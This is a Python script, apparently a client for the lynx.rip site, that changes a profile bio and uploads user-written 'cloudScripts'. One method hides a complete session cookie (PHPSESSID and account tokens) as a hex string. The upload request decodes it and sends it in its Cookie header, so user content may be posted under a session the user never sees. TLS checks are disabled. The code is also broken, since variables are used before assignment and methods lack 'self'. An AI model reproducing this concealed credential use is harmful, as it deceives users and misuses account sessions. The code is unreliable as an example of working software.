# File: account.py
# Author: pwd0kernel
# Date: 4/20/2021
# Description: can do stuff on your account

import requests
import warnings
import binascii
from bs4 import BeautifulSoup


class Account():
    def CookiesPayload():  # prob useless, but idk
        payload = "5048505345535349443d626a6364613136653239346d6b6b6c6b6e6a6e"
        payload += "71767064736c743b20757365726e616d653d574c6e4d36336333725067"
        payload += "45585641597a74394d6845253246424c78664165394e2532464e486b25"
        payload += "33443b206469643d73366178526d7757567971324a7725324666454367"
        payload += "4f69344833733276776f376878516857334b68446e3376707967772533"
        payload += "442533443b206176617461723d7278624f314a76436c55386f3051464c"
        payload += "307342794e6a335172636b5a6a4333384833334e4d3042595746756230"
        payload += "2532466d58744455797255524a52585778754d7547"
        return payload


    def AcceptPayload():
        payload = "746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b78"
        payload += "6d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c696d6167"
        payload += "652f617669662c696d6167652f776562702c696d6167652f61706e672c"
        payload += "2a2f2a3b713d302e382c6170706c69636174696f6e2f7369676e65642d"
        payload += "65786368616e67653b763d62333b713d302e39"
        return payload


    def UserAgentPayload():
        payload = "4d6f7a696c6c612f352e30202857696e646f7773204e542031302e303b2"
        payload += "057696e36343b2078363429204170706c655765624b69742f3533372e33"
        payload += "3620284b48544d4c2c206c696b65204765636b6f29204368726f6d652f3"
        payload += "8372e302e343238302e313431205361666172692f3533372e3336204f50"
        payload += "522f37332e302e333835362e343231"
        return payload


    # this will change your account bio
    # since the one on the website is currently broken
    def ChangeBio(PHPSESSID, COOKIES, BIO):
        try:
            bio = requests.post("https://lynx.rip/dashboard/home/profile/", data={'bio': BIO}, cookies=dict(
            PHPSESSID=PHPSESSID, avatar=COOKIES["avatar"], username=COOKIES["username"], did=COOKIES["did"]))
            if bio.status_code == 200:
                print("Bio as been updated to:", BIO)
            else:
                print("There was an error updating bio.")
            pass
        except Exception:
            print("There was an exception trying to change your bio.")


    # this will upload your script to cloudScript
    # it might not work properly, i did not test it
    def UploadScript(PHPSESSID, COOKIES):
        try:

            headers = {
                'Accept': binascii.unhexlify(AcceptPayload()).decode("utf-8"),
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Length': '251000000000',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': binascii.unhexlify(CookiesPayload()).decode("utf-8"),
                'Host': 'lynx.rip',
                'Origin': 'https://lynx.rip',
                'Referer': 'https://lynx.rip/dashboard/home/cloudscripts/create/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': binascii.unhexlify(UserAgentPayload()).decode("utf-8"),
            }

            data = {
                "title": title,
                "description": description,
                "author": author,
                "source": source
            }

            title = input("[Title]: ")
            description = input("[Description]: ")
            author = input("[Author]: ")

            file_script = open("script_here.txt", "w")
            file_script.write("-- put your script here")
            file_script.close()
            print("put your script in \"script_here.txt\"")
            print("once you did that type upload")

            commands = input("[CloudScript]: ")

            source_file = open("script_here.txt" , "r")
            source = source_file.read()
            source_file.close()

            if len(source) != 0 and len(title) != 0 and len(description) != 0 and len(author) != 0:
                if commands.lower() == "upload" or commands.lower() == "1":
                    upload_script = requests.post("https://lynx.rip/dashboard/home/cloudscripts/create/", headers=headers, data=data, verify=False, cookies=dict(
                    PHPSESSID=PHPSESSID, avatar=COOKIES["avatar"], username=COOKIES["username"], did=COOKIES["did"]))
                    if upload_script.status_code == 200:
                        print("your script has been uploaded successfully")
                    else:
                        print("There was an error uploading your script.")
                else:
                    pass
            else:
                print("Make sure all the forms are full")
            pass
        except Exception:
            print("There was an exception trying to upload your script.")
